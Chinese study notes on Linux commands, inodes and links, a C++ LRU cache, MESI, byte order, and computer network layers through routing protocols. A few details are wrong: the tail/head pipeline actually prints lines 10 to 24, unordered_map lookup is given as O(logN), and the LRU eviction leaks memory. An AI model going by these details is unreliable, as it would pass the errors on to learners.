tail -n 10		显示最后10行
tail -n +10		从第10行显示到最后
head -n 10		显示前面10行
cat test.log | tail -n +10 | head -n 15		从第10行显示到第15行

chmod [u/g/o/a] [+/-/=][r/w/x] file		文件权限管理
	user, group, other, all	
	增加，取消，取消之前的
	读取4
	写入2
	执行1
	0

tar -xvf file.tar		解压tar包
tar -zxvf file.tar.gz	解压tar.gz
tar -jxvf file.tar.bz2	解压tar.bz2
tar -Zxvf file.tar.Z	解压tar.Z

vi /etc/profile
source /etc/profile

top/htop				监控系统的cpu，内存等运行情况

sudo ufw enable			开启防火墙
sudo ufw default deny	关闭所有外部访问

sudo ufw disable		关闭防火墙
sudo ufw status			查看防火墙状态

sudo ufw allow 80		允许外部访问80端口
sudo ufw delete allow 80	删除允许访问

whatis					命令的作用
whereis					命令的位置
find					搜索
find <指定目录><指定条件><指定动作>,   find / -name 'interfaces'
```



## Linux文件系统

- `superblock`：记录文件系统的整体信息，包括inode和block的总量，使用量和剩余量，以及文件系统的格式及相关信息等；
- `block bitmap`：记录block是否被使用的位图
- `inode`：一个文件占用一个inode，记录文件的属性，同时记录此文件的内容所在的block编号；
- `block`：记录文件的内容，文件太大时，会占用多个block

![img](../assets/post/2018-04-02/BSD_disk.png)

**文件系统如何找到文件？**

- 根据文件名，通过Dictionary的对应关系，找到文件对用的inode number
- 再根据inode number读取到文件的inode table
- 根据inode table中的pointer读取到相应的blocks

## Linux文件是怎么存储的

一个文件由目录项，inode和数据块组成。

- 目录项：包括文件名和inode节点号
- inode：又称为文件索引节点，包含文件的基础信息以及数据块的指针
- 数据块：包含文件的具体内容

硬盘的最小存储单元为”扇区sector“，每个扇区存储512字节（0.5KB），操作系统读取硬盘时，一次性连续读取多个扇区，即一个”块block“。每个块最常见的大小为4K，即8个扇区

inode存储文件的元信息，以及文件数据block的位置。

- 一个文件可以被存储在一个或者多个block中
- 每个文件都会并且只会占用一个inode，inode可以指向该文件所在的block
- 想读取该文件，需要通过**目录项**的文件名来指向正确的inode号码才能读取
  - **目录项：**当新建一个目录时，文件系统会分配一个inode和至少一个block给该目录。其中inode记录目录的相关权限和属性，并记录分配到的那块block目录。而block则是记录在这个目录下的文件名和其对应的inode号码数据，这就是数据项

## 文件处理命令（待学习）

### grep

文本过滤器，可以使用正则表达式搜索文本，并把匹配的行打印出来。

### sed

流编辑器，默认只处理模式空间，不处理原数据。处理时，把当前处理的行存储在临时缓冲区，称为“模式空间”（pattern space），接着用sed命令处理缓冲区中的内容，处理完成后，把缓冲区的内容送到屏幕，接着处理下一行，直到文件末尾。文件内容并没有改变，除非使用重定向存储输出。

### awk

文本分析工具，相对于grep的查找，sed的编辑，awk在数据分析和生成数据显得尤为强大。awk把文件逐行读入，以空格为默认分隔符将每行切片，切开的部分进行分析处理。

## 文件的三种时间

- `mtime(Modification)`：更改文件内容时会更新这个时间
- `atime(Access)`：读取文件，比如使用less，more读取时会更新这个时间
- `ctime(Change)`：在修改权限，写入文件、更改所有者、权限或者链接设置时随着inode的内容更改而更改，即文件状态最后一次被更改的时间

## shell脚本

待学习

## 硬链接和软连接

### 硬链接

`ln [sourceFile] [linkName]`

A是B的硬链接，则A的目录项中的inode节点号于B的目录项中的inode节点号相同，即一个inode节点对应两个不同的文件名，A和B对于系统来说是完全平等的。

如果删除了其中一个，对另一个没有影响。每增加一个硬链接的文件名，inode节点上的链接数增加1，每删除一个就减1，直到为0，inode节点和对应的block被回收。

**注意：**文件和文件名是两个不同的东西，`rm A`删除的只是A这个文件名，但是其对应的数据块（文件）并没有被删除，文件只有在inode节点链接数减少为0时才会被删除。

### 软连接

`ln -s [sourceFile] [linkName]`

A是B的软连接，A的目录项中的inode节点号和B的目录项中的inode节点号不同，A和B指向不同的inode，继而指向不同的数据库。但是A的数据块中存储的是B的路径名（可以根据这个路径名找到B的目录项）。A和B之间是“主从”关系，如果B被删除了，A依然存在，但指向的是一个无效链接。

### 区别

#### 硬链接

- 不能对目录创建硬链接，原因有几种，最重要的是：文件系统不能存在链接环（目录创建时的".."除外，这个系统可以识别出来）,存在环的后果会导致例如文件遍历等操作的混乱(du，pwd等命令的运作原理就是基于文件硬链接，顺便一提，ls -l结果的第二列也是文件的硬链接数，即inode节点的链接数)

- 不能对不同的文件系统创建硬链接,即两个文件名要在相同的文件系统下。

- 不能对不存在的文件创建硬链接，由原理即可知原因。

#### 软连接

- 可以对目录创建软连接，遍历操作会忽略目录的软连接。
- 可以跨文件系统
- 可以对不存在的文件创建软连接，因为保存的只是一个字符串

## LRU实现

使用双向链表+hashmap来进行实现。

采用双向链表的原因是：如果是单向链表，则删除节点的时候从表头开始遍历查找，效率为O(N)，采用双向链表可以直接改变节点的前驱的指针指向进行删除，可以达到O(1)的效率。

同时使用hashmap来保存节点的key,value值便于能在O(logN)的时间查找元素，进行get操作。

应该具有的操作：

- `set(key,value)`：如果key在hashmap中存在，则先重置对应的value值，然后获取对应的节点cur，将cur节点从链表中删除，并移动到链表的头部；如果不存在，则新建一个节点，并将该节点放置到链表的头部。当Cache存满的时候，将链表最后一个节点删除即可。
- `get(key)`：如果key在hashmap中存在，则把对应的节点放在链表头部，并返回对应的value值；如果不存在，则返回-1；

```c++
#include<iostream>
#include<unordered_map>
using namespace std;

struct CacheNode {
    int key;
    int value;
    CacheNode *pre, *next;
    CacheNode(int k, int v) : key(k), value(v), pre(NULL), next(NULL) {}
};

class LRUCache{
private:
    int size;   
    CacheNode *head, *tail;
    unordered_map<int, CacheNode *> mp;   
public:
    LRUCache(int capacity) : size(capacity), head(NULL), tail(NULL) {}

    int get(int key)
    {
        unordered_map<int, CacheNode *>::iterator it = mp.find(key);
        if (it != mp.end()){     // 获取的key存在
            CacheNode *node = it -> second;
            __remove(node);     // 更新key位置到头部
            __setHead(node); 
            return node -> value;
        }
        else
            return -1;
    }

    void set(int key, int value){
        unordered_map<int, CacheNode *>::iterator it = mp.find(key);
        if (it != mp.end()){    // 获取的key存在
            CacheNode *node = it -> second;
            node -> value = value;  // 更新key位置到头部
            __remove(node);
            __setHead(node);
        }
        else{                   // 获取的key不存在
            CacheNode *newNode = new CacheNode(key, value);
            if (mp.size() >= size){ // 缓存区已满，就删除尾部节点
                unordered_map<int, CacheNode *>::iterator iter = mp.find(tail -> key);
                __remove(tail);
                mp.erase(iter);
            }                       // 设置节点到头部
            __setHead(newNode);
            mp[key] = newNode;
        }
    }

    // 内部函数，删除链表上的一个节点
    void __remove(CacheNode *node){
        if (node -> pre != NULL)
            node -> pre -> next = node -> next;
        else
            head = node -> next;
        if (node -> next != NULL)
            node -> next -> pre = node -> pre;
        else
            tail = node -> pre;
    }

    // 内部函数，将node设置为头节点
    void __setHead(CacheNode *node){
        node -> next = head;
        node -> pre = NULL;

        if (head != NULL)
            head -> pre = node;
        head = node;
        if (tail == NULL)
            tail = head;
    }
};

int main(int argc, char **argv)
{
  LRUCache *lruCache = new LRUCache(2);
  lruCache -> set(2, 1);
  lruCache -> set(1, 1);
  cout << lruCache -> get(2) << endl;
  lruCache -> set(4, 1);
  cout << lruCache -> get(1) << endl;
  cout << lruCache -> get(2) << endl;
}
```

## 现代多核CPU计算机如果保持数据一致性

32位处理器和64位处理器使用**MESI(修改、独占、共享、无效)**控制协议去维护内部缓存和其它处理器缓存的一致性。

说明：多个CPU从主内存读取了同一份数据到各自的高速缓存（L1、L2或其它），当其中一个CPU修改了数据往主内存同步时，其它CPU会通过**总线嗅探机制**感知到数据的变化，从而让自己缓存的数据无效，当感知到变化的CPU再往主内存写数据时，会先从主内存读取一份计算再回写。

## 字节序

- 大端字节序：高位字节在低位内存，地位字节在高位内存，符合人类阅读习惯。网络字节序
- 小端字节序：与大端相反。x86
- 为什么要有大小端字节序：计算机电路先处理低位字节，效率比较高，因为计算都是从低位开始的。所以，计算机的内部处理都是小端字节序；但是，人类还是习惯读写大端字节序。所以，除了计算机的内部处理，其他的场合几乎都是大端字节序，比如网络传输和文件储存。一般只有读取外部数据的时候才需要考虑字节序 。
- 如何判断：将一个多字节的值（4字节整数）存入内存（即赋值给一个变量），然后用指针取其首地址所对应的字节（即低地址的一个字节），判断该字节存放的高位还是地位，如果是高位则是大端，否则是小端。

# 计算机网络分层

## 概述

### 网络

网络把主机连接起来，而互连网（internet）是把多种不同的网络连接起来，因此互连网是网络的网络。而互联网（Internet）是全球范围的互连网。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-01\network-of-networks.png" alt="img" style="zoom:80%;" />
</div>

### ISP

互联网服务提供商 ISP 可以从互联网管理机构获得许多 IP 地址，同时拥有通信线路以及路由器等联网设备，个人或机构向 ISP 缴纳一定的费用就可以接入互联网。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-01\isp1.png" alt="img" style="zoom:50%;" />
</div>

目前的互联网是一种多层次 ISP 结构，ISP 根据覆盖面积的大小分为第一层 ISP、区域 ISP 和接入 ISP。互联网交换点 IXP 允许两个 ISP 直接相连而不用经过第三个 ISP。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-01\isp2.png" alt="img" style="zoom:50%;" />
</div>

### 主机之间的通信方式

客户-服务器（C/S）：客户是服务的请求方，服务器是服务的提供方

对等（P2P）：不区分客户和服务器

### 电路交换和分组交换

- 电路交换：电路交换用于电话通信系统，两个用户要通信之前需要建立一条专用的物理链路，并且在整个通信过程中始终占用该链路。由于通信的过程中不可能一直在使用传输线路，因此电路交换对线路的利用率很低，往往不到 10%。
- 分组交换：每个分组都有首部和尾部，包含了源地址和目的地址等控制信息，在同一个传输线路上同时传输多个分组互相不会影响，因此在同一条传输线路上允许同时传输多个分组，也就是说分组交换不需要占用传输线路。
  - 在一个邮局通信系统中，邮局收到一份邮件之后，先存储下来，然后把相同目的地的邮件一起转发到下一个目的地，这个过程就是存储转发过程，分组交换也使用了存储转发过程。

### 时延

总时延 = 排队时延 + 处理时延 + 传输时延 + 传播时延

- 排队时延：分组在路由器的输入队列和输出队列中排队等待的时间，取决于网络当前的通信量
- 处理时延：主机或路由器收到分组时进行处理所需要的时间，例如分析首部、从分组中提取数据、进行差错检验或查找适当的路由等。
- 传输时延：主机或路由器传输数据帧所需要的时间。
- 传播时延：电磁波在信道中传播所需要花费的时间，电磁波传播的速度接近光速。

## 计算机网络体系结构

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-01\layers2.png" alt="img" style="zoom:100%;" />
</div>

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-01\layers.png" alt="img" style="zoom:50%;" />
</div>

- **物理层（比特Bit）**：考虑的是怎样在传输媒体上传输数据比特流，而不是指具体的传输媒体。物理层的作用是尽可能屏蔽传输媒体和通信手段的差异，使数据链路层感觉不到这些差异。
- `RJ45， IEEE802.3(中继器，集线器)`
- **数据链路层（帧Frame）**：网络层针对的还是主机之间的数据传输服务，而主机之间可以有很多链路，链路层协议就是为同一链路的主机提供数据传输服务。数据链路层把网络层传下来的分组封装成帧。
- `PPP,FR,HDLC,VLAN,MAC(网桥，交换机)`
- **网络层（包Packet）**：为主机提供数据传输服务。而传输层协议是为主机中的进程提供数据传输服务。网络层把传输层传递下来的报文段或者用户数据报封装成分组。
- `IP,ICMP,IGMP,ARP,RARP,OSPF,IPX,RIP,IGRP(路由器)`
- **传输层（段Segment）**：为进程提供通用数据传输服务。由于应用层协议很多，定义通用的传输层协议就可以支持不断增多的应用层协议。运输层包括两种协议：
  - 传输控制协议 TCP，提供面向连接、可靠的数据传输服务，数据单位为报文段；
  - 用户数据报协议 UDP，提供无连接、尽最大努力的数据传输服务，数据单位为用户数据报。
  - TCP 主要提供完整性服务，UDP 主要提供及时性服务。
- `TCP,UDP,SPX(通常用于游戏联机)`
- **应用层（报文Message）**为特定应用程序提供数据传输服务，例如 HTTP、DNS 等协议。
- `FTP,DNS,Telnet,SMTP,HTTP,WWW,NFS`
- 数据在向下传输的过程中，需要添加下层协议所需要的首部或者尾部；在向上传输的过程中给不断拆开首部或者尾部。
- **路由器**只有下面三层协议，因为路由器处于网络核心中，不需要为进程或者应用程序提供服务，因此也就不需要传输层和应用层。

### OSI

其中表示层和会话层用途如下：

- **表示层** ：数据压缩、加密以及数据描述，这使得应用程序不必关心在各台主机中数据内部格式不同的问题。
- **会话层** ：建立及管理会话。

五层协议没有表示层和会话层，而是将这些功能留给应用程序开发者处理。

### TCP/IP

它只有四层，相当于五层协议中数据链路层和物理层合并为网络接口层。

TCP/IP 体系结构不严格遵循 OSI 分层概念，应用层可能会直接使用 IP 层或者网络接口层。

## 物理层

传输数据的单位：比特

根据信息在传输线上的传送方向，分为以下三种通信方式：

- 单工通信：单向传输
- 半双工通信：双向交替传输
- 全双工通信：双向同时传输

### 带通调制

模拟信号是连续的信号，数字信号是离散的信号。带通调制把数字信号转换为模拟信号。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-01\band.png" alt="img" style="zoom:40%;" />
</div>

## 数据链路层

### 基本问题

- 封装成帧：将网络层传下来的分组添加首部和尾部，用于标记帧的开始与结束。
- 透明传输：透明表示一个实际存在的事物看起来好像不存在一样。帧使用首部和尾部进行定界，如果帧的数据部分含有和首部尾部相同的内容，那么帧的开始和结束位置就会被错误的判定。需要在数据部分出现首部尾部相同的内容前面插入转义字符。如果数据部分出现转义字符，那么就在转义字符前面再加个转义字符。在接收端进行处理之后可以还原出原始数据。这个过程透明传输的内容是转义字符，用户察觉不到转义字符的存在。
- 差错检测：目前数据链路层广泛使用了循环冗余检验（CRC）来检查比特差错。

### 信道分类

- 广播信道：一对多通信，一个节点发送的数据能够被广播信道上所有的节点接收到。
  - 所有的节点都在同一个广播信道上发送数据，因此需要有专门的控制方法进行协调，避免发生冲突（冲突也叫碰撞）。
  - 主要有两种控制方法进行协调，一个是使用信道复用技术，一是使用 CSMA/CD 协议。
- 点对点信道：一对一通信
  - 因为不会发生碰撞，因此也比较简单，使用 PPP 协议进行控制。

### 信道复用技术

- 频分复用：所有主机在相同的时间占用不同的频率带宽资源。
- 时分复用：所有主机在不同的时间占用相同的频率带宽资源。
  - 使用频分复用和时分复用进行通信，在通信的过程中主机会一直占用一部分信道资源。但是由于计算机数据的突发性质，通信过程没必要一直占用信道资源而不让出给其它用户使用，因此这两种方式对信道的利用率都不高。
- 统计时分复用：是对时分复用的一种改进，**不固定每个用户在时分复用帧中的位置**，只要有数据就集中起来组成统计时分复用帧然后发送。

- 波分复用：光的频分复用。由于光的频率很高，因此习惯上用波长而不是频率来表示所使用的光载波。
- 码分复用：为每个用户分配`m bit `的码片，并且所有的码片正交

### CSMA/CD协议

表示载波监听多点接入/碰撞检测

- 多点接入：说明这是总线型网络，许多主机以多点的方式连接到总线上
- 载波监听：每个主机都必须不停的监听信道，在发送前，如果监听到信道正在使用，就必须等待
- **碰撞检测** ：在发送中，如果监听到信道已有其它主机正在发送数据，就表示发生了碰撞。虽然每个主机在发送数据之前都已经监听到信道为空闲，但是由于电磁波的传播时延的存在，还是有可能会发生碰撞。

记端到端的传播时延为 `t`，最先发送的站点最多经过 `2t` 就可以知道是否发生了碰撞，称 `2t` 为 **争用期** 。只有经过争用期之后还没有检测到碰撞，才能肯定这次发送不会发生碰撞。

当发生碰撞时，站点要停止发送，等待一段时间再发送。这个时间采用 **截断二进制指数退避算法** 来确定。从离散的整数集合 `{0, 1, .., (2k-1)}` 中随机取出一个数，记作` r`，然后取 `r` 倍的争用期作为重传等待时间。

### PPP协议

互联网用户通常需要连接到某个 ISP 之后才能接入到互联网，PPP 协议是用户计算机和 ISP 进行通信时所使用的数据链路层协议。

PPP的帧格式：

- F 字段为帧的定界符
- A 和 C 字段暂时没有意义
- FCS 字段是使用 CRC 的检验序列
- 信息部分的长度不超过 1500

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-01\ppp.png" alt="img" style="zoom:80%;" />
</div>

### MAC地址

MAC 地址是链路层地址，长度为 6 字节（48 位），用于唯一标识网络适配器（网卡）。

一台主机拥有多少个网络适配器就有多少个 MAC 地址。例如笔记本电脑普遍存在无线网络适配器和有线网络适配器，因此就有两个 MAC 地址。

前24位代表网络硬件制造商的编号（由IEEE分配），后24位代表该制造商所制造的某个网络产品的编号。

### 局域网

局域网是一种典型的广播信道，主要特点是网络为一个单位所拥有，且地理范围和站点数目均有限。

主要有以太网、令牌环网、FDDI 和 ATM 等局域网技术，目前以太网占领着有线局域网市场。

可以按照网络拓扑结构对局域网进行分类：主要有星型，环形，直线型局域网

### 以太网

以太网是一种星型拓扑结构局域网。

早期使用集线器进行连接，集线器是一种物理层设备， 作用于比特而不是帧，当一个比特到达接口时，集线器重新生成这个比特，并将其能量强度放大，从而扩大网络的传输距离，之后再将这个比特发送到其它所有接口。如果集线器同时收到两个不同接口的帧，那么就发生了碰撞。

目前以太网使用**交换机替代了集线器**，**交换机是一种链路层设备，它不会发生碰撞，能根据 MAC 地址进行存储转发**。

以太网帧格式：

- **类型** ：标记上层使用的协议；
- **数据** ：长度在 46-1500 之间，如果太小则需要填充；
- **FCS** ：帧检验序列，使用的是 CRC 检验方法；

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-01\yitai.png" alt="img" style="zoom:80%;" />
</div>

### 交换机

交换机具有自学习能力，学习的是交换表的内容，交换表中存储着 MAC 地址到接口的映射。

正是由于这种自学习能力，因此交换机是一种即插即用设备，不需要网络管理员手动配置交换表内容。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-01\jiaohuanji.png" alt="img" style="zoom:80%;" />
</div>

上图中，交换机有 4 个接口，主机 A 向主机 B 发送数据帧时，交换机把主机 A 到接口 1 的映射写入交换表中。为了发送数据帧到 B，先查交换表，此时没有主机 B 的表项，那么主机 A 就发送广播帧，主机 C 和主机 D 会丢弃该帧，主机 B 回应该帧向主机 A 发送数据包时，交换机查找交换表得到主机 A 映射的接口为 1，就发送数据帧到接口 1，同时交换机添加主机 B 到接口 2 的映射。

### 虚拟局域网

虚拟局域网可以建立与物理位置无关的逻辑组，只有在同一个虚拟局域网中的成员才会收到链路层广播信息。

使用 VLAN 干线连接来建立虚拟局域网，每台交换机上的一个特殊接口被设置为干线接口，以互连 VLAN 交换机。IEEE 定义了一种扩展的以太网帧格式 802.1Q，它在标准以太网帧上加进了 4 字节首部 VLAN 标签，用于表示该帧属于哪一个虚拟局域网。

## 网络层

因为网络层是整个互联网的核心，因此应当让网络层尽可能简单。网络层向上只提供简单灵活的、无连接的、尽最大努力交互的数据报服务。

使用 IP 协议，可以把异构的物理网络连接起来，使得在网络层看起来好像是一个统一的网络。

与 IP 协议配套使用的还有三个协议：

- 地址解析协议 ARP（Address Resolution Protocol）
- 网际控制报文协议 ICMP（Internet Control Message Protocol）
- 网际组管理协议 IGMP（Internet Group Management Protocol）

### IP数据报格式

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-01\ip.png" alt="img" style="zoom:60%;" />
</div>

- **版本** : 有 4（IPv4）和 6（IPv6）两个值；
- **首部长度** : 占 4 位，因此最大值为 15。值为 1 表示的是 1 个 32 位字的长度，也就是 4 字节。因为固定部分长度为 20 字节，因此该值最小为 5。如果可选字段的长度不是 4 字节的整数倍，就用尾部的填充部分来填充。
- **区分服务** : 用来获得更好的服务，一般情况下不使用。
- **总长度** : 包括首部长度和数据部分长度。
- **生存时间** ：TTL，它的存在是为了防止无法交付的数据报在互联网中不断兜圈子。以路由器跳数为单位，当 TTL 为 0 时就丢弃数据报。
- **协议** ：指出携带的数据应该上交给哪个协议进行处理，例如 ICMP、TCP、UDP 等。
- **首部检验和** ：因为数据报每经过一个路由器，都要重新计算检验和，因此检验和不包含数据部分可以减少计算的工作量。
- **标识** : 在数据报长度过长从而发生分片的情况下，相同数据报的不同分片具有相同的标识符。
- **片偏移** : 和标识符一起，用于发生分片的情况。片偏移的单位为 8 字节。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-01\ipdataseg.png" alt="img" style="zoom:40%;" />
</div>

### IP地址编码方式

IP地址的编码方式经过了三个节点：分类，子网划分，无分类

#### 分类

由两部分组成，网络号和主机号，其中不同分类具有不同的网络号长度，并且是固定的。

`IP 地址 ::= {< 网络号 >, < 主机号 >}`

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-01\ipfenlei.png" alt="img" style="zoom:40%;" />
</div>

#### 子网划分

通过在主机号字段中拿一部分作为子网号，把两级 IP 地址划分为三级 IP 地址。

`IP 地址 ::= {< 网络号 >, < 子网号 >, < 主机号 >}`

要使用子网，必须配置**子网掩码**。一个 B 类地址的默认子网掩码为` 255.255.0.0`，如果 B 类地址的子网占两个比特，那么子网掩码为 `11111111 11111111 11000000 00000000`，也就是 `255.255.192.0`。

注意，外部网络看不到子网的存在。

#### 无分类

无分类编址 CIDR 消除了传统 A 类、B 类和 C 类地址以及划分子网的概念，使用网络前缀和主机号来对 IP 地址进行编码，网络前缀的长度可以根据需要变化。

`IP 地址 ::= {< 网络前缀号 >, < 主机号 >}`

CIDR 的记法上采用在 IP 地址后面加上网络前缀长度的方法，例如 `128.14.35.7/20 `表示前 20 位为网络前缀。

CIDR 的地址掩码可以继续称为子网掩码，子网掩码首 1 长度为网络前缀的长度。

一个 CIDR 地址块中有很多地址，一个 CIDR 表示的网络就可以表示原来的很多个网络，并且在路由表中只需要一个路由就可以代替原来的多个路由，减少了路由表项的数量。把这种通过使用网络前缀来减少路由表项的方式称为路由聚合，也称为 **构成超网** 。

在路由表中的项目由“网络前缀”和“下一跳地址”组成，在查找时可能会得到不止一个匹配结果，应当采用最长前缀匹配来确定应该匹配哪一个。

### 地址解析协议ARP

网络层实现主机之间的通信，而链路层实现具体每段链路之间的通信。因此在通信过程中，IP 数据报的源地址和目的地址始终不变，而 MAC 地址随着链路的改变而改变。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-01\networkconf.png" alt="img" style="zoom:40%;" />
</div>

ARP实现由IP地址得到MAC地址。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-01\arp.png" alt="img" style="zoom:70%;" />
</div>

每个主机都有一个 **ARP 高速缓存**，里面有本局域网上的各主机和路由器的 IP 地址到 MAC 地址的映射表。

如果主机 A 知道主机 B 的 IP 地址，但是 ARP 高速缓存中没有该 IP 地址到 MAC 地址的映射，此时主机 A 通过广播的方式发送 ARP 请求分组，主机 B 收到该请求后会发送 ARP 响应分组给主机 A 告知其 MAC 地址，随后主机 A 向其高速缓存中写入主机 B 的 IP 地址到 MAC 地址的映射。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-01\arptheory.png" alt="img" style="zoom:70%;" />
</div>

### 网际控制报文协议ICMP

ICMP 是为了更有效地转发 IP 数据报和提高交付成功的机会。它封装在 IP 数据报中，但是不属于高层协议。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-01\icmp.png" alt="img" style="zoom:50%;" />
</div>

ICMP 报文分为差错报告报文和询问报文。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-01\icmpmsg.png" alt="img" style="zoom:50%;" />
</div>

#### ping

Ping 是 ICMP 的一个重要应用，主要用来测试两台主机之间的连通性。

Ping 的原理是通过向目的主机发送 ICMP Echo 请求报文，目的主机收到之后会发送 Echo 回答报文。Ping 会根据时间和成功响应的次数估算出数据包往返时间以及丢包率。

#### traceroute

Traceroute 是 ICMP 的另一个应用，用来跟踪一个分组从源点到终点的路径。

Traceroute 发送的 IP 数据报**封装的是无法交付的 UDP 用户数据报**，**并由目的主机发送终点不可达差错报告报文**。

- 源主机向目的主机发送一连串的 IP 数据报。第一个数据报 P1 的生存时间 TTL 设置为 1，当 P1 到达路径上的第一个路由器 R1 时，R1 收下它并把 TTL 减 1，此时 TTL 等于 0，R1 就把 P1 丢弃，并向源主机发送一个 ICMP 时间超过差错报告报文；
- 源主机接着发送第二个数据报 P2，并把 TTL 设置为 2。P2 先到达 R1，R1 收下后把 TTL 减 1 再转发给 R2，R2 收下后也把 TTL 减 1，由于此时 TTL 等于 0，R2 就丢弃 P2，并向源主机发送一个 ICMP 时间超过差错报文。
- 不断执行这样的步骤，直到最后一个数据报刚刚到达目的主机，主机不转发数据报，也不把 TTL 值减 1。但是因为数据报封装的是无法交付的 UDP，因此目的主机要向源主机发送 ICMP 终点不可达差错报告报文。
- 之后源主机知道了到达目的主机所经过的路由器 IP 地址以及到达每个路由器的往返时间。

### 虚拟专用网VPN

由于 IP 地址的紧缺，一个机构能申请到的 IP 地址数往往远小于本机构所拥有的主机数。并且一个机构并不需要把所有的主机接入到外部的互联网中，机构内的计算机可以使用仅在本机构有效的 IP 地址（专用地址）。

有三个专用地址块：

- `10.0.0.0 ~ 10.255.255.255`
- `172.16.0.0 ~ 172.31.255.255`
- `192.168.0.0 ~ 192.168.255.255`

VPN 使用公用的互联网作为本机构各专用网之间的通信载体。专用指机构内的主机只与本机构内的其它主机通信；虚拟指好像是，而实际上并不是，它有经过公用的互联网。

下图中，场所 A 和 B 的通信经过互联网，如果场所 A 的主机 X 要和另一个场所 B 的主机 Y 通信，IP 数据报的源地址是 `10.1.0.1`，目的地址是 `10.2.0.3`。数据报先发送到与互联网相连的路由器 R1，R1 对内部数据进行加密，然后重新加上数据报的首部，源地址是路由器 R1 的全球地址` 125.1.2.3`，目的地址是路由器 R2 的全球地址 `194.4.5.6`。路由器 R2 收到数据报后将数据部分进行解密，恢复原来的数据报，此时目的地址为` 10.2.0.3`，就交付给 Y。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-01\vpn.png" alt="img" style="zoom:40%;" />
</div>

### 网络地址转换NAT

专用网内部的主机使用本地 IP 地址又想和互联网上的主机通信时，可以使用 NAT 来将本地 IP 转换为全球 IP。

在以前，NAT 将本地 IP 和全球 IP 一一对应，这种方式下拥有 n 个全球 IP 地址的专用网内最多只可以同时有 n 台主机接入互联网。为了更有效地利用全球 IP 地址，现在常用的 NAT 转换表把传输层的端口号也用上了，使得多个专用网内部的主机共用一个全球 IP 地址。使用端口号的 NAT 也叫做网络地址与端口转换 NAPT。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-01\napt.png" alt="img" style="zoom:60%;" />
</div>

### 路由器结构

路由器从功能上可以划分为：路由选择和分组转发。

分组转发结构由三个部分组成：交换结构、一组输入端口和一组输出端口。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-01\route.png" alt="img" style="zoom:80%;" />
</div>

#### 路由器分组转发流程

- 从数据报的首部提取目的主机的 IP 地址 D，得到目的网络地址 N。
- 若 目的网络地址 就是与此路由器直接相连的某个网络地址，则进行直接交付；
- 若路由表中有目的地址为 D 的特定主机路由，则把数据报传送给表中所指明的下一跳路由器；
- 若路由表中有到达网络 N 的路由，则把数据报传送给路由表中所指明的下一跳路由器；
- 若路由表中有一个默认路由，则把数据报传送给路由表中所指明的默认路由器；
- 报告转发分组出错。

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-01\transmit.png" alt="img" style="zoom:80%;" />
</div>

#### 路由选择协议

路由选择协议都是自适应的，能随着网络通信量和拓扑结构的变化而自适应地进行调整。

互联网可以划分为许多较小的自治系统 AS，一个 AS 可以使用一种和别的 AS 不同的路由选择协议。

可以把路由选择协议划分为两大类：

- 自治系统内部的路由选择：RIP 和 OSPF
- 自治系统间的路由选择：BGP

#### 1，内部网关协议RIP

RIP 是一种基于距离向量的路由选择协议。距离是指跳数，直接相连的路由器跳数为 1。**跳数最多为 15**，超过 15 表示不可达。

RIP 按固定的时间间隔仅和相邻路由器交换自己的路由表，经过若干次交换之后，所有路由器最终会知道到达本自治系统中任何一个网络的最短距离和下一跳路由器地址。

距离向量算法：

- 对地址为 X 的相邻路由器发来的 RIP 报文，先修改报文中的所有项目，把下一跳字段中的地址改为 X，并把所有的距离字段加 1；
- 对修改后的 RIP 报文中的每一个项目，进行以下步骤：
  - 若原来的路由表中没有目的网络 N，则把该项目添加到路由表中；
  - 否则：若下一跳路由器地址是 X，则把收到的项目替换原来路由表中的项目；否则：若收到的项目中的距离 d 小于路由表中的距离，则进行更新（例如原始路由表项为 Net2, 5, P，新表项为 Net2, 4, X，则更新）；否则什么也不做。
- 若 3 分钟还没有收到相邻路由器的更新路由表，则把该相邻路由器标为不可达，即把距离置为 16。

RIP 协议实现简单，开销小。但是 RIP 能使用的最大距离为 15，限制了网络的规模。并且当网络出现故障时，要经过比较长的时间才能将此消息传送到所有路由器。

#### 2，内部网关协议OSPF

开放最短路径优先 OSPF，是为了克服 RIP 的缺点而开发出来的。

开放表示 OSPF 不受某一家厂商控制，而是公开发表的；最短路径优先表示使用了 Dijkstra 提出的最短路径算法 SPF。

OSPF 具有以下特点：

- 向本自治系统中的所有路由器发送信息，这种方法是**洪泛法**。
- 发送的信息就是与相邻路由器的链路状态，链路状态包括与哪些路由器相连以及链路的度量，度量用费用、距离、时延、带宽等来表示。
- 只有当链路状态发生变化时，路由器才会发送信息。

所有路由器都具有全网的拓扑结构图，并且是一致的。相比于 RIP，**OSPF 的更新过程收敛的很快**。

#### 4，外部网关协议BGP

BGP（Border Gateway Protocol，边界网关协议）

AS 之间的路由选择很困难，主要是由于：

- 互联网规模很大；
- 各个 AS 内部使用不同的路由选择协议，无法准确定义路径的度量；
- AS 之间的路由选择必须考虑有关的策略，比如有些 AS 不愿意让其它 AS 经过。

BGP 只能寻找一条比较好的路由，而不是最佳路由。

**每个 AS 都必须配置 BGP 发言人，通过在两个相邻 BGP 发言人之间建立 TCP 连接来交换路由信息。**

<div class="image-wrapper" style="text-align: center">
<img src="..\\assets\post\2020-03-01\bgp.png" alt="img" style="zoom:60%;" />
</div>

